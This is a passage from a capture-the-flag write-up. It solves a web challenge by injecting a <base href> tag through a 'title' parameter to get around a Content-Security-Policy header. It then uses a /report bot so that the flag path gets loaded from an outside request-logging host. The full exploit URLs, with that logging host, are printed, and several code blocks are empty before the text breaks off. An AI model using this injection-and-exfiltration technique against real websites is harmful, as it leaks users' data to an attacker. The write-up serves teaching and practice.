        path = flag
    else:
        path = "static/flag"
    response = make_response(

    url = request.args.get("url", default="", type=str)
    if not url:
        return "No url parameter provided to surf to"
    return requests.get(f"http://surfer:8075?url={url}").text

## Solution
Visiting the website, we get the following output, as expected:
```html
   Flags for Friendly Fellows
    Flags for Friendly Fellows
```
The `title` field is clearly vulnerable to injection, but scripts won't execute due to the existence of the CSP (Content-Security-Policy) header.
The solution is to inject an HTML tag instead: ``. This tag instructs the browser to load all relative resources from a given base address instead of assuming addresses are relative to the current page's URI.
Let's try visiting `http://45.76.92.221:8070/?title=%3Cbase%20href=%22https://www.google.com%22%20/%3E`:
```html
```
In this case, the browser attempts to load `/static/flag.gif` from `https://www.google.com` (this obviously fails).
But what if we replace `https://www.google.com` with a server that logs all requests, such as [requestbin.com](https://requestbin.com)? 
```html
```
Any access to this page will attempt to load the resource from `https://enskhpoprq3jl.x.pipedream.net`, which will be logged and visible by us. If we visit the page, `/static/flag.gif` will be loaded. But according to the challenge comments, we can trigger a bot to visit any link using the `/report` API, and the bot will have the cookie value which will load the real flag as the image path.
To conclude, we need to access:
```
http://45.76.92.221:8070/report?url=http://45.76.92.221:8070/?title=%3Cbase%20href=%22https://enskhpoprq3jl.x.pipedream.net%22%20/%3E
```
The bot visits:
```
http://45.76.92.221:8070/?title=%3Cbase%20href=%22https://enskhpoprq3jl.x.pipedream.net%22%20/%3E
```
The visit gets logged:
```
